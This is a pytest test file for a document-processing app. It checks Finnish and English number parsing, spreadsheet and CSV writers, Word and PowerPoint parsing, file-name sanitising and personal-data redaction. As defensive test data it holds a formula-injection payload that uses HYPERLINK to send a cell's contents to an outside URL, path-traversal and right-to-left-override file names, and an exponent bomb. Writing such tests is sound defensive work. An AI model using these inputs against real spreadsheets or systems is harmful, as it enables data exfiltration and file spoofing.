"""Content must not be lost, misread or turned into something else on the way
in or out: numbers in English and Finnish notation, native chart data, Word
content controls and text boxes, file names with Finnish letters, spreadsheet
cells that look like formulas, and personal-data redaction."""
from __future__ import annotations

import csv

import pytest
from docx import Document
from docx.oxml import parse_xml
from openpyxl import load_workbook
from pptx import Presentation
from pptx.chart.data import CategoryChartData
from pptx.enum.chart import XL_CHART_TYPE
from pptx.util import Inches

from app.schemas.artifacts import XlsxSheet, XlsxSpec
from app.services.features import data_query as dq
from app.services.features.privacy_guard import RedactionItem, pattern_scan, redact_text
from app.services.parsers import parse_file
from app.services.writers.simple_writers import csv_safe, write_csv
from app.services.writers.xlsx_writer import write_xlsx
from app.utils.files import sanitize_filename
from app.utils.numbers import infer_decimal_comma, parse_number


# ------------------------------------------------------------------ numbers
@pytest.mark.parametrize("text,decimal_comma,expected", [
    ("1148", None, 1148),
    ("1 148", None, 1148),  # Finnish thousands
    ("184 600 000", None, 184600000),
    ("184,6", None, 184.6),  # Finnish decimal comma
    ("1 148,5", None, 1148.5),
    ("1,148.5", None, 1148.5),  # English
    ("1.148,5", None, 1148.5),  # German
    ("1,148,000", None, 1148000),
    ("1,148", None, None),  # 1148 or 1.148: undecidable alone
    ("1,148", True, 1.148),
    ("1,148", False, 1148),
    ("1.148", True, 1148),
    ("1.148", None, 1.148),
    ("0,148", None, 0.148),
    ("45 %", None, 45),
    ("−3,5", None, -3.5),  # Unicode minus
    ("007", None, None),  # identifiers keep their leading zero
    ("00100", None, None),  # a Finnish postcode
    ("040 123 456", None, None),  # a phone number
    ("14.8.2026", None, None),  # a date
    ("12,5,3", None, None),
    ("abc", None, None),
])
def test_numbers_in_english_and_finnish_notation(text, decimal_comma, expected):
    assert parse_number(text, decimal_comma) == expected


def test_a_column_shows_its_decimal_convention():
    assert infer_decimal_comma(["184,6", "1 148"]) is True
    assert infer_decimal_comma(["1,148,000", "12.5"]) is False
    assert infer_decimal_comma(["1,148", "2,300"]) is None  # no evidence either way
    assert infer_decimal_comma(["1", "2"]) is None


# ---------------------------------------------------------- ask your data
def test_finnish_csv_numbers_can_be_computed_on(tmp_path):
    path = tmp_path / "kohteet.csv"
    path.write_text("Kohde;Teho MW;Henkilöstö\nPohjankangas;184,6;1 148\nKoskenniska;12,5;35\n", encoding="utf-8")
    doc = parse_file(path, "kohteet.csv")
    doc.source_path = str(path)
    table = dq.load_table(doc)
    assert table.rows == [["Pohjankangas", 184.6, 1148], ["Koskenniska", 12.5, 35]]
    plan = dq.QueryPlan(computed=[], filters=[], group_by="", select=[], sort=[], limit=0, chart=dq.Chart(),
                        explanation="", aggregates=[dq.Aggregate(column="Teho MW", func="sum", alias="total")])
    assert dq.execute_plan(table, plan).rows == [[197.1]]


def test_expressions_are_arithmetic_only():
    columns = ["Exam score", "weight"]
    evaluate = dq.compile_expression("Exam score * 0.5 + Weight", columns)  # spaces and case
    assert evaluate({"Exam score": 80, "weight": 2}) == 42.0
    assert evaluate({"Exam score": None, "weight": 2}) is None
    assert dq.compile_expression("weight / 0", columns)({"weight": 1}) is None
    for bad in ["9 ** 9 ** 9 ** 9", "weight if weight else 1", "[weight]", "True + weight", "weight @ weight"]:
        with pytest.raises(dq.DataQueryError, match="Unsupported"):
            dq.compile_expression(bad, columns)
    with pytest.raises(dq.DataQueryError, match="Unknown column"):
        dq.compile_expression("nosuch * 2", columns)


# ------------------------------------------------------------------ writers
def test_spreadsheet_text_never_becomes_a_formula(tmp_path):
    exfiltrate = '=HYPERLINK("https://example.com/?"&B2,"open")'
    spec = XlsxSpec(workbook_title="t", sheets=[XlsxSheet(
        name="s", headers=["Value", "=1+1"],
        rows=[[exfiltrate, "184,6"], ["1 148", "007"], ["45 %", "1234567890123456"]])])
    ws = load_workbook(write_xlsx(spec, tmp_path / "x.xlsx")).active
    assert ws["A2"].value == exfiltrate and ws["A2"].data_type == "s"
    assert ws["B1"].value == "=1+1" and ws["B1"].data_type == "s"
    assert ws["B2"].value == 184.6 and ws["A3"].value == 1148  # Finnish numbers are numbers
    assert ws["B3"].value == "007" and ws["A4"].value == "45 %" and ws["B4"].value == "1234567890123456"

    out = write_csv(spec, tmp_path / "x.csv")
    rows = list(csv.reader(out.read_text(encoding="utf-8-sig").splitlines()))
    assert rows[1][0] == "'" + exfiltrate and rows[0][1] == "'=1+1"
    assert csv_safe("-5") == "-5" and csv_safe("@SUM(A1)") == "'@SUM(A1)" and csv_safe("+358 40 123") == "'+358 40 123"


# ------------------------------------------------------------------ parsers
def test_native_chart_data_is_read_as_a_table(tmp_path):
    prs = Presentation()
    slide = prs.slides.add_slide(prs.slide_layouts[5])
    slide.shapes.title.text = "Revenue"
    data = CategoryChartData()
    data.categories = ["2024", "2025"]
    data.add_series("MEUR", (168.9, 184.6))
    slide.shapes.add_chart(XL_CHART_TYPE.COLUMN_CLUSTERED, Inches(1), Inches(1.5), Inches(6), Inches(4), data)
    prs.save(tmp_path / "chart.pptx")
    section = parse_file(tmp_path / "chart.pptx", "chart.pptx").sections[0]
    assert "| 2025 | 184.6 |" in section.markdown and "no text on this slide" not in section.markdown
    assert section.metadata["charts"] == 1


W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
MC = 'xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"'
WPS = 'xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape"'
V = 'xmlns:v="urn:schemas-microsoft-com:vml"'


def test_word_content_controls_and_text_boxes_are_read(tmp_path):
    doc = Document()
    doc.add_heading("Budget", 1)
    doc.add_paragraph("Visible paragraph.")
    body = doc.element.body
    body.insert(len(body) - 1, parse_xml(
        f"<w:sdt {W}><w:sdtContent><w:p><w:r><w:t>Filled-in field: 4.2 MEUR</w:t></w:r></w:p></w:sdtContent></w:sdt>"))
    # A text box is stored twice (DrawingML and a VML fallback); it must be read once.
    box = "<w:txbxContent><w:p><w:r><w:t>Text box: approved 14.8.2025</w:t></w:r></w:p></w:txbxContent>"
    body.insert(len(body) - 1, parse_xml(
        f"<w:p {W} {MC} {WPS} {V}><w:r><mc:AlternateContent>"
        f"<mc:Choice Requires=\"wps\"><w:drawing><wps:txbx>{box}</wps:txbx></w:drawing></mc:Choice>"
        f"<mc:Fallback><w:pict><v:textbox>{box}</v:textbox></w:pict></mc:Fallback>"
        "</mc:AlternateContent></w:r></w:p>"))
    doc.save(tmp_path / "form.docx")
    md = parse_file(tmp_path / "form.docx", "form.docx").full_markdown
    assert "Filled-in field: 4.2 MEUR" in md
    assert md.count("Text box: approved 14.8.2025") == 1


# ------------------------------------------------------------ file names
@pytest.mark.parametrize("name,expected", [
    ("ohjausryhmän_pöytäkirja_4_2025.docx", "ohjausryhmän_pöytäkirja_4_2025.docx"),
    ("Käyttöönotto – raportti.pdf", "Käyttöönotto – raportti.pdf"),
    ("../../evil name.txt", "evil name.txt"),
    ('a<>:"|?*b.txt', "a_b.txt"),
    ("report\u202efdp.exe", "report_fdp.exe"),  # an invisible right-to-left override
    ("CON.txt", "_CON.txt"),
    ("..", "file"),
])
def test_file_names_keep_their_letters_but_nothing_unsafe(name, expected):
    assert sanitize_filename(name) == expected


def test_uploaded_finnish_file_keeps_its_name(client):
    r = client.post("/api/documents/upload", files={"file": ("pöytäkirja.txt", "Kokous 14.8.2025".encode())})
    assert r.status_code == 201 and r.json()["display_name"] == "pöytäkirja.txt"


# ------------------------------------------------------------ privacy guard
def test_finnish_amounts_are_not_phone_numbers():
    found = {(f.text, f.category) for f in pattern_scan(
        "Liikevaihto 184 600 000 euroa, henkilöstö 1 148. Soita 040 123 4567 tai +358 40 765 4321.")}
    assert ("040 123 4567", "phone") in found and ("+358 40 765 4321", "phone") in found
    assert not any(text.startswith(("184", "1 148")) for text, _ in found)


def test_redaction_replaces_whole_words_only():
    text, _ = redact_text("Annual report by Ann Lee. Ann signed; ANN agreed.",
                          [RedactionItem(text="Ann", category="person", replacement="C:\\x")])
    assert text == "Annual report by C:\\x Lee. C:\\x signed; C:\\x agreed."


# --------------------------------------------------------------- evaluation
def test_suite_lists_each_questions_tier(client):
    questions = client.get("/api/eval/suite").json()["questions"]
    assert {q["difficulty"] for q in questions} == {"standard", "hard"}


def test_benchmark_run_accepts_tiers_and_the_auto_strategy():
    from app.routers.evaluation import RunRequest

    body = RunRequest(strategies=["auto"], difficulties=["hard"])
    assert body.strategies == ["auto"] and body.difficulties == ["hard"]
    with pytest.raises(ValueError):
        RunRequest(difficulties=["impossible"])
